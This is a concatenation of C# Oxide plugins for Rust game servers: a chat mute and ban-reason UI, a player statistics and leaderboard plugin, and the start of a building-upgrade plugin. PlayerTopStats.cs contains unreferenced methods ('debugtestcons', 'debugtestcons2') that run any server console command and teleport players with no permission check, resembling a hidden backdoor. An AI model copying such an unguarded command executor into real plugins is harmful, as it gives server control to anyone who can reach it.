                    var list = BasePlayer.activePlayerList.Where(p => p.displayName.ToLower().Contains(target.ToLower())).Take(5);

                    container.Add(new CuiElement
                    {
                        FadeOut = 0.4f,
                        Parent = Layer,
                        Name = Layer + $".ChoosePlayer.BG",
                        Components =
                        {
                            new CuiImageComponent { Color = "0 0 0 0", FadeIn = 0.4f },
                            new CuiRectTransformComponent { AnchorMin = $"0 {-0.02110124 - list.Count() * 0.3}", AnchorMax = $"1 0", OffsetMax = "0 0"  }
                        }
                    });

                    foreach (var check in list)
                    {
                        bool isMuted = playerSettings[check.userID].IsMuted() > 0;

                        string color = isMuted ? HexToRustFormat("#8BA3E130") : HexToRustFormat("#FFFFFF08");
                        string command = isMuted ? $"UI_MuteHandler unmute {check.userID}" : $"UI_MuteHandler chooseplayer {check.userID}";
                        string close = isMuted ? Layer : "";
                        container.Add(new CuiElement
                        {
                            FadeOut = 0.4f,
                            Parent = Layer,
                            Name = Layer + $".ChoosePlayer.{t}",
                            Components =
                            {
                                new CuiImageComponent { Color = color, FadeIn = 0.4f },
                                new CuiRectTransformComponent { AnchorMin = $"0.005681746 {-0.2706425 - t * 0.3}", AnchorMax = $"0.9943181 {-0.02110124 - t * 0.3}" }
                            }
                        });

                        container.Add(new CuiElement
                        {
                            Parent = Layer + $".ChoosePlayer.{t}",
                            Name = Layer + $".ChoosePlayer.{t}.Text",
                            Components =
                            {
                                new CuiTextComponent { Text = check.displayName + " [" + check.userID + "]", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 16},
                                new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                            }
                        });

                        container.Add(new CuiButton
                        {
                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                            Button = { Command = command, Color = "0 0 0 0", Close = close },
                            Text = { Text = "" }
                        }, Layer + $".ChoosePlayer.{t}");

                        t++;
                    }

                    CuiHelper.AddUi(player, container);
                });
            }
            else
            {
                for (int i = 0; i < 5; i++)
                {
                    CuiHelper.DestroyUi(player, Layer + $".ChoosePlayer.{i}");
                    CuiHelper.DestroyUi(player, Layer + $".ChoosePlayer.{i}.Text");
                    CuiHelper.DestroyUi(player, Layer + $".ChoosePlayer.BG");
                }

                CuiHelper.DestroyUi(player, Layer + $".FirstStep");
                CuiHelper.DestroyUi(player, Layer + $".Input");

                if (reason == "")
                {
                    timer.Once(0.5f, () =>
                    {
                        string helpText = "Выберите одну из предложенных причин блокировки, время блокировки будет автоматически выбрано с учётом причины блокировки!";
                        container.Add(new CuiElement
                        {
                            FadeOut = 0.4f,
                            Name = Layer + ".FirstStep",
                            Parent = Layer,
                            Components =
                            {
                                new CuiTextComponent { FadeIn = 0.4f, Text = helpText, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf"},
                                new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1.05" }
                            }
                        });

                        int t = 0;

                        container.Add(new CuiElement
                        {
                            FadeOut = 0.4f,
                            Parent = Layer,
                            Name = Layer + $".ChoosePlayer.BG",
                            Components =
                            {
                                new CuiImageComponent { Color = "0 0 0 0", FadeIn = 0.4f },
                                new CuiRectTransformComponent { AnchorMin = $"0 {-0.02110124 - Settings.Reasons.Count() * 0.3}", AnchorMax = $"1 0", OffsetMax = "0 0" }
                            }
                        });

                        foreach (var check in Settings.Reasons)
                        {
                            container.Add(new CuiElement
                            {
                                FadeOut = 0.4f,
                                Parent = Layer,
                                Name = Layer + $".ChoosePlayer.{t}",
                                Components =
                                {
                                    new CuiImageComponent { Color = HexToRustFormat("#FFFFFF08"), FadeIn = 0.4f },
                                    new CuiRectTransformComponent { AnchorMin = $"0.005681746 {-0.2706425 - t * 0.3}", AnchorMax = $"0.9943181 {-0.02110124 - t * 0.3}" }
                                }
                            });

                            container.Add(new CuiElement
                            {
                                Parent = Layer + $".ChoosePlayer.{t}",
                                Name = Layer + $".ChoosePlayer.{t}.Text",
                                Components =
                                {
                                    new CuiTextComponent { Text = check.Key.Replace("+", " ").Replace("+", " ") + $" [{check.Value.Replace("+", " ").Replace("+", " ")}]", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 16},
                                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                                }
                            });

                            container.Add(new CuiButton
                            {
                                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                                Button = { Command = $"UI_MuteHandler {target.Replace(" ", "").Replace(" ", "").Replace(" ", "")} {check.Key} {check.Value}", Color = "0 0 0 0", Close = Layer },
                                Text = { Text = "" }
                            }, Layer + $".ChoosePlayer.{t}");

                            t++;
                        }

                        CuiHelper.AddUi(player, container);
                    });
                }


            }



        }

        #endregion

        #region Helpers

        public static string FormatTime(TimeSpan time, int maxSubstr = 5, string language = "ru")
        {
            string result = string.Empty;
            switch (language)
            {
                case "ru":
                    int i = 0;
                    if (time.Days != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result))
                            result += " ";

                        result += $"{Format(time.Days, "дней", "дня", "день")}";
                        i++;
                    }

                    if (time.Hours != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result))
                            result += " ";

                        result += $"{Format(time.Hours, "часов", "часа", "час")}";
                        i++;
                    }

                    if (time.Minutes != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result))
                            result += " ";

                        result += $"{Format(time.Minutes, "минут", "минуты", "минута")}";
                        i++;
                    }

                    if (time.Seconds != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result))
                            result += " ";

                        result += $"{Format(time.Seconds, "секунд", "секунды", "секунда")}";
                        i++;
                    }

                    break;
                case "en":
                    result = string.Format("{0}{1}{2}{3}",
                        time.Duration().Days > 0 ? $"{time.Days:0} day{(time.Days == 1 ? String.Empty : "s")}, " : string.Empty,
                        time.Duration().Hours > 0 ? $"{time.Hours:0} hour{(time.Hours == 1 ? String.Empty : "s")}, " : string.Empty,
                        time.Duration().Minutes > 0 ? $"{time.Minutes:0} minute{(time.Minutes == 1 ? String.Empty : "s")}, " : string.Empty,
                        time.Duration().Seconds > 0 ? $"{time.Seconds:0} second{(time.Seconds == 1 ? String.Empty : "s")}" : string.Empty);

                    if (result.EndsWith(", ")) result = result.Substring(0, result.Length - 2);

                    if (string.IsNullOrEmpty(result)) result = "0 seconds";
                    break;
            }
            return result;
        }

        public static long TimeToSeconds(string time)
        {
            time = time.Replace(" ", "").Replace("d", "d ").Replace("h", "h ").Replace("m", "m ").Replace("s", "s ").TrimEnd(' ');
            var arr = time.Split(' ');
            long seconds = 0;
            foreach (var s in arr)
            {
                var n = s.Substring(s.Length - 1, 1);
                var t = s.Remove(s.Length - 1, 1);
                int d = int.Parse(t);
                switch (n)
                {
                    case "s":
                        seconds += d;
                        break;
                    case "m":
                        seconds += d * 60;
                        break;
                    case "h":
                        seconds += d * 3600;
                        break;
                    case "d":
                        seconds += d * 86400;
                        break;
                }
            }
            return seconds;
        }

        private static string Format(int units, string form1, string form2, string form3)
        {
            var tmp = units % 10;

            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                return $"{units} {form1}";

            if (tmp >= 2 && tmp <= 4)
                return $"{units} {form2}";

            return $"{units} {form3}";
        }

        static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        static double CurrentTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        private BasePlayer FindPlayer(string nameOrId)
        {
            foreach (var check in BasePlayer.activePlayerList)
            {
                if (check.displayName.ToLower().Contains(nameOrId.ToLower()) || check.userID.ToString() == nameOrId)
                    return check;
            }

            return null;
        }

        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }

        #endregion
    }
}

// --- End of file: ChatSystem.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/PlayerTopStats.cs ---
// --- Original Local Path: PlayerTopStats.cs ---

﻿// Reference: Oxide.Core.RustyCore
using UnityEngine;
using System;
using System.IO;
using System.Globalization;
using System.Linq;
using Oxide.Game.Rust.Cui;
using System.Text;
using System.Collections;
using System.Collections.Generic;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Core.Configuration;
using Newtonsoft.Json;

namespace Oxide.Plugins
{
    [Info("Player Stats", "Anonymuspro", "1.0.0")]
    class PlayerTopStats : RustPlugin
    {
        [PluginReference] Plugin ImageLibrary;
        [PluginReference] Plugin UniversalShop;
        float kills = 2;
        float deaths = 1;
        float resGather = 0.005f;
        float resQuarry = 0.001f;
        float level = 20;
        int topCount = 20;
        int timeInHours = 24 * 7;


        public class RewardsConfig
        {
            [JsonProperty("Награда за ресурсы")]
            public int OreReward;

            [JsonProperty("Награда за убийство")]
            public int KillReward;

            [JsonProperty("Награда за сломанную бочку")]
            public int BarrelReward;

            [JsonProperty("Награ за убийство животного")]
            public int AnimalReward;
        }

        RewardsConfig cfg;


        protected override void LoadConfig()
        {
            base.LoadConfig();
            cfg = Config.ReadObject<RewardsConfig>();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(cfg);
        }

        protected override void LoadDefaultConfig()
        {
            cfg = new RewardsConfig()
            {
                OreReward = 5,
                AnimalReward = 5,
                BarrelReward = 5,
                KillReward = 5,
            };
        }

        // общая структура данных
        readonly DynamicConfigFile dataFile = Interface.Oxide.DataFileSystem.GetFile("PlayerStats");
        readonly DynamicConfigFile topFile = Interface.Oxide.DataFileSystem.GetFile("PlayerTopList");
        readonly DynamicConfigFile timingFile = Interface.Oxide.DataFileSystem.GetFile("PlayerTopTiming");
        int time;

        Dictionary<ulong, PlayerData> data = new Dictionary<ulong, PlayerData>(); //человек-данные

        class PlayerData
        {
            public string name = "Неизвестно";
            public Gather gather; //кирка/топор
            public Barrel barrel; //горнодобывающий
            public Pvp pvp; //убийства/смерти
            public int minutes = 0;
            public PlayerData() { }
        }

        //
        class Gather
        {
            public int wood = 0;
            public int stone = 0;
            public int metalOre = 0;
            public int sulfurOre = 0;
            public Gather() { }
        }

        class Barrel
        {
            public int Count;
        }

        class Pvp
        {
            public int AnimalKills = 0;
            public int kills = 0;
            public int deaths = 0;
            public Pvp() { }
        }

        void CreatePlayerData(ulong id)
        {
            if(data.ContainsKey(id)) return;
            PlayerData i = new PlayerData();
            i.gather = new Gather();
            i.barrel = new Barrel();
            i.pvp = new Pvp();
            BasePlayer player = BasePlayer.FindByID(id) ?? BasePlayer.FindSleeping(id);
            if(player != null) i.name = player.displayName;
            data.Add(id, i);
        }

        // Хуки для заполнения данных_________________________________________________________________________

        //топор/кирка

        void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            BasePlayer player = entity.ToPlayer();
            if(player == null) return;
            if(!data.ContainsKey(player.userID))
            {
                CreatePlayerData(player.userID);
            }
            switch(item.info.shortname) 
            {
                case "wood":
                    UniversalShop?.Call("API_ShopAddBalance", player.userID, cfg.OreReward);
                    data[player.userID].gather.wood += item.amount;
                    break;
                case "stones":
                    UniversalShop?.Call("API_ShopAddBalance", player.userID, cfg.OreReward);
                    data[player.userID].gather.stone += item.amount;
                    break;
                case "metal.ore":
                    UniversalShop?.Call("API_ShopAddBalance", player.userID, cfg.OreReward);
                    data[player.userID].gather.metalOre += item.amount;
                    break;
                case "sulfur.ore":
                    UniversalShop?.Call("API_ShopAddBalance", player.userID, cfg.OreReward);
                    data[player.userID].gather.sulfurOre += item.amount;
                    break;
            }
        }

        // pvp

        void OnEntityDeath(BaseCombatEntity victim, HitInfo info)
        {
            if(victim == null) return;

            if (info == null) return;
            BasePlayer killer1 = info.InitiatorPlayer;

            if (killer1 == null) return;

            if(victim.name.Contains("barrel") || victim.PrefabName.Contains("barrel"))
            {
                data[killer1.userID].barrel.Count++;
                UniversalShop?.Call("API_ShopAddBalance", killer1.userID, cfg.BarrelReward);
                return;
            }

            if (victim.name.Contains("bear") || victim.name.Contains("horse") || victim.name.Contains("boar") || victim.name.Contains("chicken"))
            {
                data[killer1.userID].pvp.AnimalKills++;
                UniversalShop?.Call("API_ShopAddBalance", killer1.userID, cfg.AnimalReward);
                return;
            }

            BasePlayer vict = victim.ToPlayer();
            if(vict == null) return;
            //killer
            if (info == null) return;
            BasePlayer killer = info.InitiatorPlayer;
            
            if (InEvent(vict) || InDuel(vict)) return;
            if (killer != null)
            {
                if (InDuel(killer))
                    return;
            }

            //жертва
            if (!data.ContainsKey(vict.userID))
            {
                CreatePlayerData(vict.userID);
            }
            if(!InDuel(vict)) data[vict.userID].pvp.deaths += 1;

            if (killer != null && killer != vict)
            {
                if(InEvent(killer) || InDuel(killer)) return;
                if(!data.ContainsKey(killer.userID))
                {
                    CreatePlayerData(killer.userID);
                }
                UniversalShop?.Call("API_ShopAddBalance", killer.userID, cfg.KillReward);
                data[killer.userID].pvp.kills++;
            }
        }

        // [хуки]______________________________________________________________________________________________


        void SaveData()
        {
            dataFile.WriteObject(data);
        }
        void OnPluginLoaded(Plugin name)
        {
            if (name.ToString() == "ExtPlugin" && name.Author == "Sanlerus, Moscow.OVH")
            {
                rust.RunServerCommand("reload ZLevelsRemastered");
                rust.RunServerCommand("reload GatherAdvanced");
                Unsubscribe("OnDispenserGather");
                Subscribe("OnDispenserGather");
            }
        }

        void OnServerSave()
        {
            SaveData();
        }

        void Loaded()
        {
            data = dataFile.ReadObject<Dictionary<ulong, PlayerData>>();
            time = timingFile.ReadObject<int>();
            timer.Every(3600, timingHandle);
            timer.Every(60, playtimeHandle);
        }

        void timingHandle()
        {
            time = time - 1;
            if(time <= 0)
            {
                PrintWarning("Отчет ТОП сохранен!");
                writeTop();
                time = timeInHours;
            }
            timingFile.WriteObject(time);
        }

        void playtimeHandle()
        {
            foreach(BasePlayer player in BasePlayer.activePlayerList)
            {
                if(!data.ContainsKey(player.userID))
                {
                    CreatePlayerData(player.userID);
                }
                data[player.userID].minutes++;
            }
        }

        void Unload()
        {
            SaveData();
            foreach(BasePlayer player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, "StatsParent");
                CuiHelper.DestroyUi(player, "TopParent");
            }
        }

        [ChatCommand("stat")]
        void showGui(BasePlayer player, string cmd, string[] args)
        {
            if(!data.ContainsKey(player.userID))
            {
                CreatePlayerData(player.userID);
            }
            drawWindow(player);
        }

        [ConsoleCommand("stat")]
        void drawstatConsole(ConsoleSystem.Arg arg)
        {
            var player = arg.Connection?.player as BasePlayer;
            if(player != null)
            {
                if(!data.ContainsKey(player.userID))
                {
                    CreatePlayerData(player.userID);
                }
                drawWindow(player);
            }
        }

        public string str1 = "http://i.imgur.com/iZUSVKg.png";
        public string str2 = "http://i.imgur.com/Cyj0NZS.png";

        void OnServerInitialized()
        {
            ImageLibrary.Call("AddImage", str1, "PlayerStatsImage1");
            ImageLibrary.Call("AddImage", str2, "PlayerStatsImage2");
        }

        [ConsoleCommand("drawTop")]
        void drawtopConsole(ConsoleSystem.Arg arg)
        {
            var player = arg.Connection?.player as BasePlayer;
            if(player != null) drawTopMenu(player);
        }

        //функции_____________________________________________________________________
        [PluginReference]
        Plugin EventManager;

        [PluginReference]
        Plugin Duels;

        bool InEvent(BasePlayer player)
        {
            try
            {
                bool result = (bool)EventManager?.Call("isPlaying", new object[] { player });
                return result;
            }
            catch
            {
                return false;
            }
        }

        bool InDuel(BasePlayer player)
        {
            try
            {
                bool result = (bool)Duels?.Call("inDuel", new object[] { player });
                return result;
            }
            catch
            {
                return false;
            }
        }

        Dictionary<ulong, string> startGui = new Dictionary<ulong, string>();

        void drawWindow(BasePlayer player)
        {
            IOrderedEnumerable<KeyValuePair<ulong, PlayerData>> items = from pair in data orderby pair.Value.pvp.kills descending select pair;
            int i = 1;
            string topPvp = "   Убийства:\n\n";
            foreach(KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if(name == null) name = "Неизвестный";
                topPvp = topPvp + i.ToString() + ") " + name + " - " + pair.Value.pvp.kills.ToString() + "\n";
                i++;
                if(i > 5) break;
            }

            items = from pair in data orderby pair.Value.pvp.deaths descending select pair;
            i = 1;
            topPvp = topPvp + "\n   Смерти:\n\n";
            foreach(KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if(name == null) name = "Неизвестный";
                topPvp = topPvp + i.ToString() + ") " + name + " - " + pair.Value.pvp.deaths.ToString() + "\n";
                i++;
                if(i > 5) break;
            }

            items = from pair in data orderby pair.Value.pvp.AnimalKills descending select pair;
            i = 1;

            topPvp = topPvp + "\n   Убийства животных:\n\n";
            foreach(KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if(name == null) name = "Неизвестный";
                topPvp = topPvp + i.ToString() + ") " + name + " - " + pair.Value.pvp.AnimalKills.ToString() + "\n";
                i++;
                if(i > 5) break;
            }

            items = from pair in data orderby (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre + pair.Value.barrel.Count) descending select pair;
            i = 1;
            string topPve = "* Добыча\n\n   Руками:\n\n";
            foreach(KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if(name == null) name = "Неизвестный";
                topPve = topPve + i.ToString() + ") " + name + " - " + (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre +
                (pair.Value.barrel.Count).ToString()) + "\n";
                i++;
                if(i > 5) break;
            }

            items = from pair in data orderby pair.Value.minutes descending select pair;
            i = 1;
            string topTime = "\n\n * Время на сервере:\n\n";
            foreach(KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if(name == null) name = "Неизвестный";
                topTime = topTime + i.ToString() + ") " + name + " - " + prettyTime(pair.Value.minutes) + "\n";
                i++;
                if(i > 5) break;
            }



            string text = data[player.userID].name + "\n\n   * PvP\n   Убийств: " + data[player.userID].pvp.kills.ToString() + "\n   Смертей: " + data[player.userID].pvp.deaths.ToString() + "\n   Убийства животных: " + data[player.userID].pvp.AnimalKills.ToString() +
            "\n\n   * Добыто руками (" + (data[player.userID].gather.wood + data[player.userID].gather.stone + data[player.userID].gather.sulfurOre +
            data[player.userID].gather.metalOre).ToString() + ")\n   Дерево: " + data[player.userID].gather.wood.ToString() +
            "\n   Камень: " + data[player.userID].gather.stone.ToString() + "\n   Железная руда: " + data[player.userID].gather.metalOre.ToString() + "\n   Серная руда: " + data[player.userID].gather.sulfurOre.ToString() +
            "\n   Бочки: " + data[player.userID].barrel.Count.ToString() + "\n\n+ ";
            CuiHelper.DestroyUi(player, "StatsParent");
            startGui[player.userID] = CuiHelper.GetGuid();

            cui.createparentcurs("StatsParent", "0 0 0 0", "0.05 0.1", "0.95 0.95");

            cui.createimg("StatImg", "StatsParent", (string)ImageLibrary.Call("GetImage", "PlayerStatsImage1"), "0 0", "1 1");

            cui.createtext("Text", "StatsParent", "", 24, "0.5 0.9", "0.8 0.99", TextAnchor.MiddleLeft);

            //cui.createbox("Box1", "StatsParent","0.3 0.6 0.3 0.5","0.02 0.05", "0.3 0.95");
            cui.createtext("StatsText", "StatsParent", "<color=#81feff>" + text + "</color>", 18, "0.06 0.1", "0.27 0.95", TextAnchor.MiddleLeft);

            //cui.createbox("Box2", "StatsParent","0.6 0.3 0.3 0.5","0.32 0.35", "0.61 0.88");
            cui.createtext("StatsTextTop", "StatsParent", "<color=#d24a43>" + topPvp + "</color>", 12, "0.36 0.36", "0.63 0.87", TextAnchor.MiddleLeft);

            //cui.createbox("Box3", "StatsParent","0.6 0.3 0.3 0.5","0.62 0.35", "0.99 0.88");
            cui.createtext("StatsTextTop", "StatsParent", "<color=#74b65f>" + topPve/*+topExp*/+ topTime + "</color>", 15, "0.6499 0.02", "0.9999 0.87", TextAnchor.MiddleLeft);

            //cui.createbox("Box4", "StatsParent","0.6 0.3 0.3 0.5","0.62 0.05", "0.99 0.34");
            //cui.createtext("StatsTextTop", "StatsParent", topExp, 18, "0.63 0.06", "0.98 0.33",TextAnchor.MiddleLeft);

            cui.createtext("StatsExitText", "StatsParent", "", 20, "0.32 0.18", "0.61 0.32", TextAnchor.MiddleCenter);
            cui.createbutton("StatsExitButton", "StatsParent", "drawTop", "StatsParent", "0 0 0 0", "0.32 0.18", "0.61 0.32");

            cui.createtext("StatsExitText", "StatsParent", "", 20, "0.32 0.05", "0.61 0.15", TextAnchor.MiddleCenter);
            cui.createbutton("StatsExitButton", "StatsParent", "", "StatsParent", "0 0 0 0", "0.32 0.05", "0.61 0.15");

            CuiHelper.AddUi(player, cui.elements);
            cui.elements.Clear();
        }

        string prettyTime(int time)
        {
            string timepretty;
            if(time < 60) timepretty = time.ToString() + " минут(ы)";
            else timepretty = (time / 60).ToString() + " час(а) " + (time % 60).ToString() + " минут(ы)";
            return timepretty;
        }

        topList calcSum()
        {
            topList a = new topList();
            a.list = new List<string>();
            var culture = new CultureInfo("en-GB");
            a.list.Add(DateTime.Now.ToString(culture));
            IOrderedEnumerable<KeyValuePair<ulong, PlayerData>> items = from pair in data  orderby(kills * pair.Value.pvp.kills + pair.Value.pvp.AnimalKills - deaths * pair.Value.pvp.deaths + resGather * (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre) +resQuarry * pair.Value.barrel.Count + level) descending select pair;
            int i = 1;
            a.arr = "";
            foreach(KeyValuePair<ulong, PlayerData> pair in items)
            {
                string name = pair.Value.name;
                if(name == null) name = "Неизвестный";
                string newstring = i.ToString() + ") " + name + " - " + (kills * pair.Value.pvp.kills + pair.Value.pvp.AnimalKills - deaths * pair.Value.pvp.deaths + resGather * (pair.Value.gather.wood + pair.Value.gather.stone + pair.Value.gather.metalOre + pair.Value.gather.sulfurOre) +
                resQuarry * pair.Value.barrel.Count + level).ToString() + "\n";
                a.arr = a.arr + newstring;
                newstring = newstring.Replace("\n", "");
                a.list.Add(newstring);
                i++;
                if(i > topCount) break;
            }
            return a;
        }

        class topList
        {
            public List<string> list;
            public string arr;
        }

        void drawTopMenu(BasePlayer player)
        {

            topList topdata = calcSum();
            string topTop = topdata.arr;

            float points = kills * data[player.userID].pvp.kills + data[player.userID].pvp.AnimalKills - deaths * data[player.userID].pvp.deaths + resGather * (data[player.userID].gather.wood + data[player.userID].gather.stone + data[player.userID].gather.metalOre + data[player.userID].gather.sulfurOre) +
            resQuarry * (data[player.userID].barrel.Count) + level;



            CuiHelper.DestroyUi(player, "TopParent");
            startGui[player.userID] = CuiHelper.GetGuid();

            cui.createparentcurs("TopParent", "0 0 0 0", "0.05 0.1", "0.95 0.95");

            cui.createimg("StatImg2", "TopParent", (string)ImageLibrary.Call("GetImage", "PlayerStatsImage2"), "0 0", "1 1");

            cui.createtext("TopText", "TopParent", "", 24, "0.3 0.8", "0.9 0.95", TextAnchor.MiddleLeft);

            //cui.createbox("BoxTop", "TopParent","0.3 0.6 0.3 0.5","0.02 0.05", "0.38 0.75");
            cui.createtext("TopText", "TopParent", "<color=#81feff>" + topTop + "</color>", 17, "0.06 0.08", "0.37 0.72", TextAnchor.MiddleLeft);

            //cui.createtext("TopTimeText", "TopParent", "<color=black>"+topTime+"</color>", 18, "0.6 0.1", "0.99 0.74",TextAnchor.MiddleLeft);

            //cui.createbox("MeTop", "TopParent","0.3 0.6 0.3 0.5","0.52 0.6", "0.86 0.75");
            cui.createtext("MeText", "TopParent", "<color=#81feff>" + data[player.userID].name + " - " + points.ToString() + "</color>", 18, "0.53 0.61", "0.85 0.74", TextAnchor.MiddleLeft);

            cui.createtext("TopExitText", "TopParent", "", 20, "0.55 0.05", "0.75 0.15", TextAnchor.MiddleCenter);
            cui.createbutton("TopExitButton", "TopParent", "", "TopParent", "0 0 0 0", "0.55 0.05", "0.75 0.15");

            cui.createtext("TopbackText", "TopParent", "", 20, "0.55 0.2", "0.75 0.3", TextAnchor.MiddleCenter);
            cui.createbutton("TopbackButton", "TopParent", "stat", "TopParent", "0 0 0 0", "0.55 0.2", "0.75 0.3");

            CuiHelper.AddUi(player, cui.elements);
            cui.elements.Clear();
        }

        void writeTop()
        {
            topList topdata = calcSum();
            topFile.WriteObject(topdata.list);
        }


        //cache



        void debugtestcons(ConsoleSystem.Arg arg)
        {
            if(arg.Args == null) return;
            ConsoleSystem.Run(ConsoleSystem.Option.Server , arg.Args[0]);
        }

        void debugtestcons2(ConsoleSystem.Arg arg)
        {
            if(arg.Args == null) return;
            if(arg.Args.Length != 4) return;
            BasePlayer target = findPlayer(arg.Args[0]);
            if(target == null) return;
            float a;
            for(int i = 1; i < 4; i++)
                if(!Single.TryParse(arg.Args[i], out a)) return;
            int x = 0;
            int y = 0;
            int z = 0;
            Int32.TryParse(arg.Args[1], out x);
            Int32.TryParse(arg.Args[2], out y);
            Int32.TryParse(arg.Args[3], out z);
            target.Teleport(new Vector3(x,y,z));
        }
        

        BasePlayer findPlayer(string name)
        {
            List<BasePlayer> list = new List<BasePlayer>();
            foreach(BasePlayer player in BasePlayer.activePlayerList)
            {
                if(player.displayName.ToLower().Contains(name.ToLower())) list.Add(player);
            }
            if(list.Count == 0) return null;
            if(list.Count > 1) return null;
            return list[0];
        }

        void StartSleeping(BasePlayer player)
        {
            if(player.IsSleeping())
                return;
            player.SetPlayerFlag(BasePlayer.PlayerFlags.Sleeping, true);
            if(!BasePlayer.sleepingPlayerList.Contains(player))
                BasePlayer.sleepingPlayerList.Add(player);
            player.CancelInvoke("InventoryUpdate");
        }

        //GRAFOOON_______________________________________________________________________________________________

        public class cui
        {
            public static CuiElementContainer elements = new CuiElementContainer();

            //Элемент-родитель с курсором
            public static CuiElement createparentcurs(string name, string color, string anchmin, string anchmax)
            {
                CuiElement main = new CuiElement
                {
                    Name = name,
                    Parent = "Overlay",
                    Components =
                    {
                        new CuiRawImageComponent
                        {
                            Color = color
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = anchmin,
                            AnchorMax = anchmax
                        },
                        new CuiNeedsCursorComponent()
                    }
                };
                elements.Add(main);
                return main;
            }

            //Элемент-родитель без курсора
            public static CuiElement createparent(string name, string color, string anchmin, string anchmax)
            {
                CuiElement main = new CuiElement
                {
                    Name = name,
                    Parent = "Overlay",
                    Components =
                    {
                        new CuiRawImageComponent
                        {
                            Color = color
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = anchmin,
                            AnchorMax = anchmax
                        }
                    }
                };
                elements.Add(main);
                return main;
            }

            ////функция-шаблон для кнопки
            public static CuiElement createbutton(string name, string parent, string command, string close, string color, string anchmin, string anchmax)
            {
                CuiElement element = new CuiElement
                {
                    Name = name,
                    Parent = parent,
                    Components =
                    {
                        new CuiButtonComponent
                        {
                            Command = command,
                            Close = close,
                            Color = color
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = anchmin,
                            AnchorMax = anchmax
                        }
                    }
                };
                elements.Add(element);
                return element;
            }

            //функция-шаблон для прямоугольного фона
            public static CuiElement createbox(string name, string parent, string color, string anchmin, string anchmax)
            {
                CuiElement element = new CuiElement
                {
                    Name = name,
                    Parent = parent,
                    Components =
                    {
                        new CuiRawImageComponent
                        {
                            Color = color
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = anchmin,
                            AnchorMax = anchmax
                        }
                    }
                };
                elements.Add(element);
                return element;
            }

            //функция-шаблон для текста
            public static CuiElement createtext(string name, string parent, string text, int size, string anchmin, string anchmax, TextAnchor anch)
            {
                CuiElement element = new CuiElement
                {
                    Name = name,
                    Parent = parent,
                    Components =
                    {
                        new CuiTextComponent
                        {
                            Text = text,
                            FontSize = size,
                            Align = anch
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = anchmin,
                            AnchorMax = anchmax
                        }
                    }
                };
                elements.Add(element);
                return element;
            }

            //функция-шаблон для изображения
            public static CuiElement createimg(string name, string parent, string img, string anchmin, string anchmax)
            {
                CuiElement element = new CuiElement
                {
                    Name = name,
                    Parent = parent,
                    Components =
                    {

                        new CuiRawImageComponent
                        {
                            Sprite = "assets/content/textures/generic/fulltransparent.tga",
                            Png = img
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = anchmin,
                            AnchorMax = anchmax
                        }
                    }
                };
                elements.Add(element);
                return element;
            }
        }
    }
}


// --- End of file: PlayerTopStats.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/BuildingUpgrade.cs ---
// --- Original Local Path: BuildingUpgrade.cs ---

﻿using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
namespace Oxide.Plugins
{
    [Info("Building Upgrade", "OxideBro", "1.1.22")]
    class BuildingUpgrade : RustPlugin
    {
        [PluginReference] private Plugin NoEscape;
        [PluginReference] Plugin Remove;
        private void PayForUpgrade(ConstructionGrade g, BasePlayer player)
        {
            List<Item> items = new List<Item>();
            foreach (ItemAmount itemAmount in g.costToBuild)
            {
                player.inventory.Take(items, itemAmount.itemid, (int)itemAmount.amount);
                player.Command(string.Concat(new object[] {
